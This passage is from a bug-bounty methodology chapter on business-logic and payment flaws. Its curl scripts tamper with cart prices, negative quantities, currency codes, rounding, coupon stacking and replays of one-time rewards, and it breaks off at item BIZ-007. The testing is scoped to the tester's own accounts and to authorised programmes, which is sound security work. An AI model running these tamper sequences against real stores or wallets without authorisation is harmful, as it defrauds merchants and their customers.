# BIZ · Business logic, payments & abuse of functionality

> The application does what its code says, and the code lets a customer do something the business never meant
> to allow: pay less than the price, receive value twice, use a paid feature on a free plan, skip a mandatory
> step. Every request is well-formed, so scanners find none of it. It pays when the proof is an unearned
> entitlement or a wrong state in our own account; "the server accepted an odd value" with nothing gained is
> closed as informative.

| | |
|---|---|
| **Class** | `logic` |
| **Applies when** | http, app\|api |
| **Pays** | 456 disclosed reports filed under the class (369 more touch it), 83 paid, median $500, top $12,000. The best-paid money-path reports made the server believe the client about a payment, a balance or a state: data altered on its way to the payment provider, a payout never deducted, a fee discount redeemed many times, an approval given without the required payment details. |
| **Weaknesses** | Business Logic Errors · CWE-840 · Client-Side Enforcement of Server-Side Security · CWE-602 · Improper Input Validation · CWE-20 · Insufficient Verification of Data Authenticity · CWE-345 · Missing Authorization · CWE-862 · Improper Authorization · CWE-285 · Allocation of Resources Without Limits or Throttling · CWE-770 · Reliance on Untrusted Inputs in a Security Decision · CWE-807 |

## Why it pays

The money path is written by product teams, validated in the browser and rarely re-read by anyone who asks what
happens when a number is negative, a step is missing or a request arrives twice. Nothing in it looks like an
attack to a scanner or a WAF, so these bugs survive on mature programmes. The paying shapes in
`kb/reports/logic.md` are few:

- **The server believes the client about money.** Data altered on its way to the payment provider (#1295844,
  $7,500), a wallet credited more than was paid (#1408782, $2,000), a membership paid from a wallet that is not
  the buyer's (#938021, $2,000), a manipulated submit-payment request (#219356, $600), coins bought for less
  through an `order_id` parameter (#1213765, $500).
- **Value is granted without being consumed.** A payout whose funds were never deducted (#307239, $10,000), a fee
  discount redeemed many times (#1849626, $5,000).
- **A gate exists only in the interface.** A premium-only setting changed by a non-premium user (#3183520,
  $3,000), a feature flag the account did not have (#520623, $500), an approval step the requester completes
  alone (#1543159, $5,000; #452959, $2,500).

Rate on what was shown. One order at a wrong price is medium (`docs/06-severity.md`: payment bypass, 6.5). It
becomes high when the gain is stored value or repeats without bound, and critical only when other customers'
money is reachable. The top bounty in the class ($12,000, #894569) is an authorisation flaw filed under the
weakness name "Business Logic Errors", and many rows of the class file are library CVEs, takeovers and XSS filed
the same way; they are not prior art for this chapter. Several well-known price and quantity reports list no
bounty (#771694, #364843, #511044): shops on a VDP, and marketplaces where a seller carries the loss, often pay
nothing.

## The crux question

**Which numbers, identifiers and states does the server take from my request although it should compute, look
up or check them itself, and what does my own account hold once it believes them?**

## Applicability probe

The chapter gate is settled by the fingerprint. What decides the items is `payments`, `limited-action` and
`roles`; settle them, with `login` and `signup`, before opening any card.

```bash
# 1. Money, plan and limit vocabulary in crawled paths and bundles
grep -rEoh '/[A-Za-z0-9_/-]*(checkout|cart|basket|order|billing|subscri|plan|pricing|invoice|payment|coupon|promo|voucher|redeem|gift|credit|wallet|refund|trial|upgrade|quota|usage|seat|referral|reward|approv|verify)[A-Za-z0-9_/-]*' \
  "$E/recon/$H/" | sort | uniq -c | sort -rn | head -60
# 2. Fields that travel through the client although the server should own them
grep -rEoh '"(price|unit_price|amount|total|subtotal|currency|quantity|qty|discount|coupon|promo_code|plan|plan_id|price_id|tier|is_premium|isPremium|trial_end|credits|balance|fee|tax|shipping|status|paid|email_verified|approved|limit|seats)"\s*:' \
  "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -60
# 3. Payment provider and mode (publishable keys are public by design; only the live/test prefix matters here)
grep -rEoh 'pk_(live|test)_|js\.stripe\.com|paypal\.com/sdk|checkout\.razorpay\.com|braintreegateway|adyen|paddle\.(com|js)|chargebee|recurly|mollie|klarna' \
  "$E/recon/$H/" | sort | uniq -c
# 4. Pricing and billing pages, as A
for p in /pricing /plans /billing /settings/billing /account/billing /upgrade /cart /checkout; do
  curl -sS "${HDR[@]}" $A -o /dev/null -w "%{http_code} %{size_download} $p\n" "$T$p"; sleep 1; done
```

Then walk the application authenticated and write `$E/recon/$H/money-map.md`, one row per flow of value: what
is bought or granted, the request that fixes the price, the request that takes the payment, the request that
grants the entitlement, where the entitlement shows in our account, and every rule the product states ("once per
account", "max 3 projects", "Pro only", "needs approval", "verified e-mail required").

```bash
scripts/sane fact set "$H" payments=1 --ev "/pricing lists Free/Pro/Team; POST /api/billing/checkout creates a provider session (pk_live_)"
scripts/sane fact set "$H" limited-action=1 --ev "promo code field at checkout; free plan: 3 projects; 14-day trial once per workspace"
scripts/sane fact set "$H" roles=1 --ev "owner/admin/member in /settings/team; expenses over 100 need an admin's approval"
# nothing found after the authenticated walk:
scripts/sane fact set "$H" payments=0 limited-action=0 --ev "walked every settings page as A: no pricing, billing, cart, codes, credits, trial or stated quota"
```

With `payments` and `limited-action` false the money items close as n/a and the planner writes the reason.
BIZ-009 and BIZ-015 remain wherever `login` is true, BIZ-013 wherever `state-change` is true, BIZ-014 wherever
`roles` is true. A shop that sells to guests without any login still has a money path: the guest cart session
is the account for BIZ-001 to BIZ-005 and BIZ-007, and its cookie goes into `$A`.

Three rules hold for every card in this chapter:

- **Real money.** Most cards stop at the last request before money moves: the amount in the payment session is
  the evidence. Where a completed purchase is the only proof, ask the operator once whether the programme offers
  test cards or a sandbox, and whether one purchase of the cheapest item with the operator's own card is
  approved. Record the ask in `engagement.json` `blockers[]`; until it is answered the card ends as `candidate`.
- **One instance.** One order, one extra grant, one over-quota object. Nothing is spent, transferred, withdrawn,
  shipped or resold. The report states the net amount gained so the programme can reverse it, and every object
  created is listed for `cleanup.md`.
- **Our own identities.** Coupon codes, wallets, payment methods, e-mail addresses and phone numbers are ours.
  Never a code that was guessed, an identifier that may belong to a customer, or an address we do not own.

Loops send one request per second; lengthen the `sleep` when `$RATE` is below 1.

## Triage order

BIZ-009 (a UI-only rule: one replayed request) → BIZ-008 (a paid endpoint called from the free plan) → BIZ-001
(client-supplied price) → BIZ-002 (negative values) → BIZ-005 (coupon rules) → BIZ-007 (activation without a
matching payment) → BIZ-003 (currency) → BIZ-004 (rounding) → BIZ-006 (one-time grants) → BIZ-011 (quotas) →
BIZ-012 (trial) → BIZ-015 (verification state) → BIZ-013 (state machine) → BIZ-014 (approval, needs two roles)
→ BIZ-010 (refunds: needs a real purchase and a wait, so last).

## Items

### BIZ-001 · The checkout charges a price, total or fee taken from the request instead of the server's catalogue

| | |
|---|---|
| **Severity** | Medium standalone for one order at a chosen price; High when the purchase is stored value (top-up, credits, gift card) or a recurring plan at an arbitrary price |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #1295844, #1408782, #219356, #218748 |

- **Where:** the requests that build and price an order: add-to-cart, cart update, shipping or delivery choice,
  tip, top-up amount, plan or seat change, and the request that creates the order, subscription or payment
  session. Find them by buying the cheapest item up to the last page before payment and saving every request.
  Look for `price`, `unit_price`, `amount`, `total`, `subtotal`, `tax`, `shipping`, `fee`, `discount`, hidden
  form inputs, and identifiers that select a price (`price_id`, `plan_id`, `variant_id`, `sku`). Where checkout
  works without login, the guest session stands in for `$A`.
- **Test:** the server should price the order from its own catalogue, given only an item id and a quantity.
  Change one money field per request, add money fields the request did not carry, and swap the price identifier
  for a cheaper or retired one; then read what the server stored and what amount it asks the payment provider
  to collect. A number that is echoed but not charged is not a hit.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-001"; mkdir -p "$D"
  # 0. control: the untouched request and the total the server reports for it
  curl -sS "${HDR[@]}" $A -X POST "$T/api/cart/items" -H 'Content-Type: application/json' \
    -d '{"sku":"<sku>","quantity":1}' -D "$D/00-control.hdr" -o "$D/00-control.json"
  curl -sS "${HDR[@]}" $A "$T/api/cart" -o "$D/00-control.cart.json"
  # 1. one changed or added money field per request; read the cart back after each
  for body in \
    '{"sku":"<sku>","quantity":1,"price":1}' \
    '{"sku":"<sku>","quantity":1,"unit_price":"0.01"}' \
    '{"sku":"<sku>","quantity":1,"amount":1,"total":1}' \
    '{"sku":"<sku>","quantity":1,"discount":100,"discount_percent":100}' \
    '{"sku":"<sku>","quantity":1,"shipping":0,"tax":0,"fee":0}' \
    '{"sku":"<sku>","quantity":1,"price_id":"<id of a cheaper or archived price>"}'; do
    n=$(printf %s "$body" | md5sum | cut -c1-8)
    curl -sS "${HDR[@]}" $A -X POST "$T/api/cart/items" -H 'Content-Type: application/json' -d "$body" \
      -o "$D/01-$n.json" -w "%{http_code} $n $body\n"
    curl -sS "${HDR[@]}" $A "$T/api/cart" -o "$D/01-$n.cart.json"
    grep -Eo '"(unit_price|subtotal|total|amount_due)"\s*:\s*"?-?[0-9.]+' "$D/01-$n.cart.json" | tr '\n' ' '; echo
    curl -sS "${HDR[@]}" $A -X DELETE "$T/api/cart/items/<line id>" -o /dev/null; sleep 1; done
  # 2. what will be charged: the payment session the server creates for the tampered cart
  curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H 'Content-Type: application/json' \
    -d '{"cart_id":"<cart id>"}' -D "$D/02-session.hdr" -o "$D/02-session.json"
  grep -Eo '"(amount|amount_total|unit_amount|total|currency|url)"\s*:\s*"?[^",}]+' "$D/02-session.json"
  ```
  When the session response holds only a URL, open that URL unmodified in the scriptable browser and read the
  amount the provider's page shows. When the amount travels to a hosted payment page as form or query
  parameters, read the form and the provider's integration documentation to see whether `amount` is among the
  signed fields. The provider's host is normally out of scope: send it altered parameters only when the policy
  places the payment flow in scope; otherwise record the unsigned amount as `candidate` and tell the operator.
  Nothing above moves money. Paying the tampered session is needed only when the programme asks for a completed
  order: use its test cards, or one purchase the operator approved.
- **Proof:** an order, invoice, subscription or balance in our own account whose stored amount is the tampered
  value while the catalogue shows the real price: the control, the tampered request, the order record read back
  with GET, and the amount the provider was asked for (session JSON, provider page screenshot or receipt
  e-mail). The cheapest item that shows the difference, once; cancel the order before fulfilment where the
  product allows it. A top-up credited above the amount paid is shown by the balance; it is not spent.
- **Not a finding when:** the changed number appears in the cart response but the payment session carries the
  catalogue amount (the cart echoes input, the charge does not); the order is created as pending and re-priced
  or rejected when the provider's confirmation arrives (wait for the final state); the field is a customer-set
  amount by design (donation, tip, pay-what-you-want, a top-up above a stated minimum); the cheaper `price_id`
  is another public price of the same product (monthly instead of yearly); the environment is the provider's
  test mode, where test cards pay for anything; the account is the seller and sets its own prices.
- **Escalate:** BIZ-007 when the session amount is right but the completion step never compares what was paid.
  BIZ-003 for the `currency` field of the same request. For a recurring plan, show the renewal amount on the
  subscription object. The added-field variant is mass assignment: API chapter. A tampered identifier that
  selects another customer's cart, quote or negotiated price list is the BAC chapter.

### BIZ-002 · A negative quantity or amount is accepted and lowers the total or credits the sender

| | |
|---|---|
| **Severity** | Medium standalone for a reduced order total; High when a negative amount raises a spendable balance |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Input Validation · CWE-20 |
| **Prior art** | #771694, #364843, #74147, #403783 |

- **Where:** every signed number in the money path: cart line `quantity`, add-on and modifier counts, seats,
  nights, units; `amount` on top-ups, tips, donations, withdrawals and transfers between our own wallets; fee,
  tax and discount fields when the client sends them. Find them by saving the requests of one checkout up to
  the last page before payment and listing every numeric field. Bulk and array endpoints (a cart update
  carrying all lines) and older API versions validate less than the single-item form.
- **Test:** the server multiplies or adds the number without a lower bound. A cart with the wanted item at
  quantity 1 and a second item at a negative quantity sums to less than the wanted item costs; a transfer of
  minus X pulls X from the recipient. Send negative, zero, string and oversized values (integer wrap-around) and
  read the server-side total back after each.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-002"; mkdir -p "$D"
  tot(){ curl -sS "${HDR[@]}" $A "$T/api/cart" -o "$D/cart_$1.json"; printf '%s: ' "$1"
         grep -Eo '"(quantity|subtotal|total|amount_due)"\s*:\s*"?-?[0-9.]+' "$D/cart_$1.json" | tr '\n' ' '; echo; }
  # line 1 is the item we want; line 2 is a cheaper item used as the negative offset
  curl -sS "${HDR[@]}" $A -X POST "$T/api/cart/items" -H 'Content-Type: application/json' \
    -d '{"sku":"<wanted sku>","quantity":1}' -o "$D/line1.json"; tot 0_control
  i=0; for q in -1 0 '"-1"' -1.0 -0.5 2147483648 4294967297 99999999999999999999; do i=$((i+1))
    curl -sS "${HDR[@]}" $A -X POST "$T/api/cart/items" -H 'Content-Type: application/json' \
      -d "{\"sku\":\"<cheap sku>\",\"quantity\":$q}" -o "$D/add_$i.json" -w "%{http_code} quantity=$q\n"; tot "q$i"
    curl -sS "${HDR[@]}" $A -X DELETE "$T/api/cart/items/<cheap line id>" -o /dev/null; sleep 1; done
  # the same value through the update path and the bulk path
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/cart/items/<line id>" -H 'Content-Type: application/json' \
    -d '{"quantity":-1}' -D- -o "$D/patch.json"; tot after_patch
  curl -sS "${HDR[@]}" $A -X PUT "$T/api/cart" -H 'Content-Type: application/json' \
    -d '{"items":[{"sku":"<wanted sku>","quantity":1},{"sku":"<cheap sku>","quantity":-3}]}' -D- -o "$D/bulk.json"; tot after_bulk
  # does the payment step accept the reduced cart?
  curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H 'Content-Type: application/json' \
    -d '{"cart_id":"<cart id>"}' -o "$D/session.json"; grep -Eo '"(amount|amount_total|total)"\s*:\s*"?-?[0-9.]+' "$D/session.json"
  # amounts outside the cart, smallest unit: a tip and a top-up, then a transfer to our second account B
  neg(){ curl -sS "${HDR[@]}" $A -X POST "$T/api/$1" -H 'Content-Type: application/json' -d "$2" -o "$D/neg_$3.json" -w "%{http_code} $1\n"; sleep 1; }
  curl -sS "${HDR[@]}" $A "$T/api/wallet" -o "$D/wallet_A_before.json"
  neg 'orders/<order id>/tip' '{"amount":"-0.01"}' tip
  neg 'wallet/topup' '{"amount":"-0.01"}' topup
  curl -sS "${HDR[@]}" $B "$T/api/wallet" -o "$D/wallet_B_before.json"          # these three lines need B; skip them without one
  neg 'wallet/transfer' '{"to":"<B account id>","amount":"-0.01"}' transfer
  curl -sS "${HDR[@]}" $B "$T/api/wallet" -o "$D/wallet_B_after.json"
  curl -sS "${HDR[@]}" $A "$T/api/wallet" -o "$D/wallet_A_after.json"
  ```
- **Proof:** the server-side cart or order total below the price of the positive line alone, read back with GET
  after the write, together with a payment session created for that reduced amount. For balances: both balances
  before and after, A's higher by the amount with no payment behind it. One order at most, smallest units, and
  the extra balance stays untouched.
- **Not a finding when:** the cart stores the negative line but the payment step refuses the cart or recomputes
  the total (a stored odd value with no charge behind it is cosmetic); the negative line is a returns or
  credit-note feature of a merchant role; the total floors at zero and the order cannot be completed; an
  oversized quantity only produces a 500 or a stock error; the reduced figure exists only in the page's own
  arithmetic while the API total is right.
- **Escalate:** a total below zero: read the order object for a refund or store credit of the difference, and
  stop there. A negative quantity together with a minimum-spend or free-shipping threshold: BIZ-005. Fractional
  values: BIZ-004. On a marketplace where we hold a seller test account, a negative quantity that raises our own
  stock count is a second, separate integrity finding.

### BIZ-003 · Changing the currency code keeps the number and changes the denomination

| | |
|---|---|
| **Severity** | Medium standalone; High when stored value is bought in a weak currency and credited in a strong one |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #1677155, #803876 |

- **Where:** products sold in more than one currency or region. The currency reaches the server as a body field
  (`currency`, `currency_code`), a query parameter, a cookie or header (`currency=`, `X-Currency`, `country`,
  `locale`, `store`), the billing country of the profile, or the storefront path (`/en-us/`, `/en-in/`). Wallets
  with several balances and crypto or alternative payment methods belong here too. A product with a single
  currency and no such input anywhere has nothing to test: close the card with
  `scripts/sane mark "$H" BIZ-003 skipped --note "single currency, no currency or region input in the money path"`.
- **Test:** the amount is checked against the catalogue as a bare number while the currency travels separately,
  or the price is fixed in one step and the currency can still change in a later one. Keep the cart, switch the
  currency to a weaker one, and compare the number in the payment session with the control. Mind the exponent:
  an API in minor units treats 1000 as 10.00 USD and as 1000 JPY.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-003"; mkdir -p "$D"
  # 0. the catalogue price per currency, as the server states it
  for c in USD EUR GBP INR IDR JPY TRY ARS KWD; do
    curl -sS "${HDR[@]}" $A "$T/api/plans?currency=$c" -o "$D/plans_$c.json" -w "%{http_code} $c\n"; sleep 1; done
  # 1. same purchase, currency switched when the payment session is created
  for c in USD INR IDR JPY; do
    curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H 'Content-Type: application/json' \
      -d "{\"plan_id\":\"<plan id>\",\"currency\":\"$c\"}" -o "$D/session_$c.json"
    printf '%s: ' "$c"; grep -Eo '"(amount|amount_total|unit_amount|currency)"\s*:\s*"?[0-9A-Za-z.]+' "$D/session_$c.json" | tr '\n' ' '; echo; sleep 1; done
  # 2. currency carried outside the body (when it rides in a cookie, edit that cookie in the $A arguments instead)
  curl -sS "${HDR[@]}" $A -H 'X-Currency: IDR' -X POST "$T/api/checkout/session?currency=IDR&country=ID" \
    -H 'Content-Type: application/json' -d '{"plan_id":"<plan id>"}' -o "$D/session_header.json"
  # 3. price fixed first, currency changed afterwards
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/orders/<pending order id>" -H 'Content-Type: application/json' \
    -d '{"currency":"IDR"}' -D- -o "$D/patch_currency.json"
  curl -sS "${HDR[@]}" $A "$T/api/orders/<pending order id>" | grep -Eo '"(total|amount|currency)"\s*:\s*"?[0-9A-Za-z.]+'
  ```
  For a wallet, run step 1 against the top-up session and note which balance, in which currency, the server
  says it will credit.
- **Proof:** the payment session, or the order record and receipt, carrying the catalogue's number with the
  weaker currency code, beside the control in the listed currency: catalogue 49.00 USD, session
  `"amount_total":4900,"currency":"inr"`. Add the exchange-rate arithmetic. Complete one purchase only when the
  session amount cannot be shown otherwise and the operator approved it; then the entitlement (plan active,
  balance credited) is the proof.
- **Not a finding when:** the server converts (the number changes with the currency at a plausible rate); the
  cheaper figure is the published regional price and the only step taken was choosing that region (regional
  pricing reached through a VPN or a billing-country change is a pricing-policy matter and is closed as
  informative); an unsupported currency is rejected or replaced by the default; the difference is the provider's
  own exchange-rate rounding.
- **Escalate:** convert there and back between our own balances and compare: BIZ-004. Refund in a different
  currency than the payment at the same number: BIZ-010. The same switch on the renewal of a subscription.

### BIZ-004 · A fractional quantity or sub-unit amount is rounded in the buyer's favour

| | |
|---|---|
| **Severity** | Low standalone for a gain of a few minor units; Medium when one request yields a whole unit for a rounded-down price or removes a percentage fee |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #388564, #808975, #927661 |

- **Where:** quantity fields that should be integers (items, seats, licences) and are parsed as decimals; amount
  fields that accept more decimals than the currency has; percentage fees, commissions and taxes computed per
  transaction; conversions between our own balances, or between points and money. Candidates are the fields
  where the UI offers only whole steps or two decimals while the request carries a free JSON number or string.
- **Test:** price and entitlement are rounded by different code. A quantity of 0.1 is charged as a tenth of the
  unit price while fulfilment still delivers one unit; a percentage fee on a small enough amount rounds to zero;
  a conversion rounds up in both directions. Show it with one or two operations and the arithmetic, never by
  looping to accumulate value.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-004"; mkdir -p "$D"
  # 1. fractional quantity on a unit item: compare the line total with the quantity the order will grant
  for q in 0.1 0.01 0.5 0.999 1.4 1e-2 '"0.1"'; do
    curl -sS "${HDR[@]}" $A -X PATCH "$T/api/cart/items/<line id>" -H 'Content-Type: application/json' \
      -d "{\"quantity\":$q}" -o /dev/null -w "%{http_code} quantity=$q -> "
    curl -sS "${HDR[@]}" $A "$T/api/cart" | grep -Eo '"(quantity|line_total|subtotal|total)"\s*:\s*"?[0-9.]+' | tr '\n' ' '; echo; sleep 1; done
  curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H 'Content-Type: application/json' \
    -d '{"cart_id":"<cart id>"}' -o "$D/session.json"; grep -Eo '"(amount|amount_total|quantity)"\s*:\s*"?[0-9.]+' "$D/session.json"
  # 2. sub-unit amounts under a percentage fee: does the quoted fee reach zero? (quotes move no money)
  for a in 1.00 0.10 0.04 0.02 0.01 0.004; do
    printf 'amount=%s -> ' "$a"; curl -sS "${HDR[@]}" $A -X POST "$T/api/transfers/quote" -H 'Content-Type: application/json' \
      -d "{\"amount\":\"$a\",\"currency\":\"<currency>\"}" | grep -Eo '"(amount|fee|net|total)"\s*:\s*"?[0-9.]+' | tr '\n' ' '; echo; sleep 1; done
  # 3. one conversion round trip on our own balance, with the smallest amount the API accepts
  curl -sS "${HDR[@]}" $A "$T/api/wallet" -o "$D/wallet_before.json"
  curl -sS "${HDR[@]}" $A -X POST "$T/api/wallet/convert" -H 'Content-Type: application/json' \
    -d '{"from":"<cur1>","to":"<cur2>","amount":"0.01"}' -o "$D/convert_1.json"
  curl -sS "${HDR[@]}" $A -X POST "$T/api/wallet/convert" -H 'Content-Type: application/json' \
    -d '{"from":"<cur2>","to":"<cur1>","amount":"<all of cur2 received>"}' -o "$D/convert_2.json"
  curl -sS "${HDR[@]}" $A "$T/api/wallet" -o "$D/wallet_after.json"
  ```
- **Proof:** one order in our account that grants a whole unit (a seat, an item, a licence) for a line total
  below the unit price; or one executed operation whose stated percentage fee is zero on a non-zero amount; or
  the balance before and after one round trip with a net gain. Add the arithmetic: gain per operation, smallest
  operation the API accepts, and what limits repetition, without performing the repetition.
- **Not a finding when:** fractions are valid for the product (weight, hours, metered usage) and price and
  entitlement use the same fraction; the charge is rounded up or to nearest and the entitlement down; the gain
  exists only in a displayed figure; the gain per operation is under one minor unit and a minimum amount or a
  fixed fee per operation makes repetition unprofitable (note it and park); the "error" is a float artefact in
  JSON such as `0.30000000000000004`.
- **Escalate:** a fee that rounds to zero: give the split-payment arithmetic for a realistic sum in the report.
  Negative fractions: BIZ-002. A gain that only matters at volume needs parallel requests: RAC chapter, within
  the programme's rate limit.

### BIZ-005 · A discount code applies twice to one order, stacks with an excluded code, or survives a cart change that voids it

| | |
|---|---|
| **Severity** | Low standalone for a marginal extra discount; Medium when the broken rule takes an order to zero or well below the best single-code price |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #3426839, #1717650, #59179 |

- **Where:** the code field of the cart or checkout (`coupon`, `promo_code`, `discount_code`, `voucher`), codes
  applied by URL or cookie (`?coupon=`, `?ref=`), automatic discounts (first order, bundle, student), gift
  cards and loyalty points used as payment. Use only codes we hold legitimately: public promotions shown on the
  site, welcome or newsletter codes sent to our own accounts, codes we create in our own seller or admin test
  account. Guessing or enumerating codes is outside this card. A checkout with no code field and no automatic
  discount has nothing to test: `scripts/sane mark "$H" BIZ-005 skipped --note "no discount mechanism at checkout"`.
- **Test:** the "already applied" check compares the raw string or only the most recent code, and the discount
  is not recomputed when the cart changes. Apply the same code again in spellings a string compare treats as
  different, apply a second code the UI refuses to combine, then remove the eligibility (minimum spend, required
  product) after the code was accepted. For a single-use code, place a second order with it after the first
  completed and after the first was cancelled.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-005"; mkdir -p "$D"; C='<a code we legitimately hold>'
  tot(){ curl -sS "${HDR[@]}" $A "$T/api/cart" -o "$D/cart_$1.json"; printf '%s: ' "$1"
         grep -Eo '"(subtotal|discount|discount_total|total)"\s*:\s*"?-?[0-9.]+' "$D/cart_$1.json" | tr '\n' ' '; echo; }
  ap(){ curl -sS "${HDR[@]}" $A -X POST "$T/api/cart/coupons" -H 'Content-Type: application/json' -d "$1" \
          -o "$D/apply_$2.json" -w '%{http_code} '; tot "$2"; sleep 1; }
  tot 0_baseline
  ap "{\"code\":\"$C\"}" 1_once
  # the same code again, in spellings a string compare treats as different
  ap "{\"code\":\"$C\"}" 2_repeat
  ap "{\"code\":\"$(printf %s "$C" | tr 'A-Z' 'a-z')\"}" 3_lower
  ap "{\"code\":\" $C \"}" 4_spaces
  ap "{\"code\":\"$C\",\"codes\":[\"$C\",\"$C\"]}" 5_array
  curl -sS "${HDR[@]}" $A -X POST "$T/cart/coupon" --data-urlencode "coupon=$C" --data-urlencode "coupon=$C" \
    -o "$D/dup_param.html" -w '%{http_code} '; tot 6_dup_param
  # a second code the UI refuses to combine with the first
  ap '{"code":"<second code we hold>"}' 7_stack
  # void the eligibility after the code was accepted: drop below the minimum spend, then read the discount
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/cart/items/<line id>" -H 'Content-Type: application/json' -d '{"quantity":1}' -o /dev/null; tot 8_after_cart_change
  # what the provider will be asked to charge
  curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H 'Content-Type: application/json' \
    -d '{"cart_id":"<cart id>"}' -o "$D/session.json"; grep -Eo '"(amount|amount_total|total)"\s*:\s*"?-?[0-9.]+' "$D/session.json"
  ```
- **Proof:** a payment session or order in our account whose discount exceeds what the code's stated rule
  allows: the rule as the product words it ("one code per order", "minimum spend 50", "single use"), the request
  sequence, the server-side cart after each step and the final amount. The session amount is enough for the
  repeat, stacking and cart-change cases and moves no money. Reuse needs two orders in our account carrying the
  same single-use code: the cheapest eligible item, paid with test cards or with the operator's approval, and
  cancelled after capture.
- **Not a finding when:** the second apply answers "applied" and the discount total does not move (an idempotent
  endpoint); the codes are combinable by design or by the merchant's configuration; the cart view is stale and
  the payment step recomputes the discount; the code is a public multi-use promotion, so reuse is its purpose;
  free shipping combines with a percentage code where the platform documents the two as different discount
  classes.
- **Escalate:** the parallel form of the same test is the RAC chapter (#1717650 and #59179 are filed there). A
  fixed-amount code larger than the cart: BIZ-002 for the negative total. Gift cards and stored-value codes:
  BIZ-006. Enumerating codes needs `bruteforce-ok` and is not part of this card.

### BIZ-006 · A one-time credit, reward or code is granted again when its trigger is replayed or undone and redone

| | |
|---|---|
| **Severity** | Medium standalone for one extra grant; High when the grant is money-equivalent (balance, fee waiver, licence) and nothing bounds the repetition |
| **Requires** | limited-action, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #1849626, #3378540, #592803, #1257428 |

- **Where:** every rule that says "once": gift-card and licence-key redemption, welcome credit, referral bonus,
  daily reward, points for a purchase, a review or a completed profile, fee waivers, "claim offer" buttons,
  free credits per workspace, items in a reward shop. Find them in the terms of each promotion and in requests
  named `claim`, `redeem`, `reward`, `bonus`, `grant`.
- **Test:** the grant is tied to an event instead of a consumed record, so re-creating the event grants again.
  Sequentially (the parallel form is the RAC chapter): replay the claim; undo and redo the action that earns it;
  repeat it under a key the uniqueness check may not cover (a second workspace of the same account, an older
  API version, a platform parameter, the code in another case). Judge by the balance, not by the status code.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-006"; mkdir -p "$D"
  bal(){ curl -sS "${HDR[@]}" $A "$T/api/account/credits" -o "$D/bal_$1.json"; printf '%s: ' "$1"
         grep -Eo '"(balance|credits|points)"\s*:\s*"?-?[0-9.]+' "$D/bal_$1.json" | tr '\n' ' '; echo; }
  bal 0_before
  # 1. the legitimate claim, then the identical request again
  curl -sS "${HDR[@]}" $A -X POST "$T/api/rewards/claim" -H 'Content-Type: application/json' -d '{"reward_id":"<id>"}' -D- -o "$D/claim_1.json"; bal 1_after_claim
  curl -sS "${HDR[@]}" $A -X POST "$T/api/rewards/claim" -H 'Content-Type: application/json' -d '{"reward_id":"<id>"}' -D- -o "$D/claim_2.json"; bal 2_after_replay
  # 2. undo and redo the action that earns the grant, one cycle
  curl -sS "${HDR[@]}" $A -X POST "$T/api/newsletter/unsubscribe" -o /dev/null -w 'undo %{http_code}\n'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/newsletter/subscribe" -o /dev/null -w 'redo %{http_code}\n'; bal 3_after_redo
  # 3. the same claim under a key the uniqueness check may not cover
  curl -sS "${HDR[@]}" $A -X POST "$T/api/rewards/claim" -H 'Content-Type: application/json' -H 'X-Workspace-Id: <our second workspace>' \
    -d '{"reward_id":"<id>"}' -o "$D/claim_ws2.json"; bal 4_after_second_workspace
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/rewards/claim" -H 'Content-Type: application/json' \
    -d '{"reward_id":"<id>","platform":"ios"}' -o "$D/claim_v1.json"; bal 5_after_old_version
  # 4. a code we own: exact repeat, other case, trailing space
  for c in '<code>' '<code in the other case>' '<code> '; do
    curl -sS "${HDR[@]}" $A -X POST "$T/api/redeem" -H 'Content-Type: application/json' -d "{\"code\":\"$c\"}" \
      -o /dev/null -w "%{http_code} [$c]\n"; sleep 1; done; bal 6_after_codes
  ```
- **Proof:** the balance or entitlement in our account raised twice for one qualifying event: before, after the
  legitimate grant, after the extra grant, with the rule quoted ("once per account"). Two grants in total. The
  extra value is not spent, transferred or withdrawn, and the report states its amount for reversal.
- **Not a finding when:** the second response is 200 and the balance did not move; the reward is repeatable by
  design (daily, per purchase, per workspace); the extra grant is removed by a reconciliation job (re-read after
  the stated settlement time before claiming); the "second grant" came from a second account of ours referring
  the first: referral and multi-account abuse is a terms-of-service matter and is closed as informative unless
  a technical control was bypassed.
- **Escalate:** the same claim sent in parallel: RAC chapter. A purchase that earns a reward and is then
  refunded: BIZ-010. On GraphQL, aliases repeat a claim mutation inside one request: GQL-007. If the grant can
  be turned into money, describe the conversion path without using it.

### BIZ-007 · An order or plan is activated without a confirmed payment that matches it

| | |
|---|---|
| **Severity** | Medium standalone for one paid order or plan activated without payment; High when the product is stored value or a forged notification marks any order id as paid |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insufficient Verification of Data Authenticity · CWE-345 |
| **Prior art** | #938021, #1213765, #2170559, #682617 |

- **Where:** the last steps of each purchase flow: the browser's return URL after payment
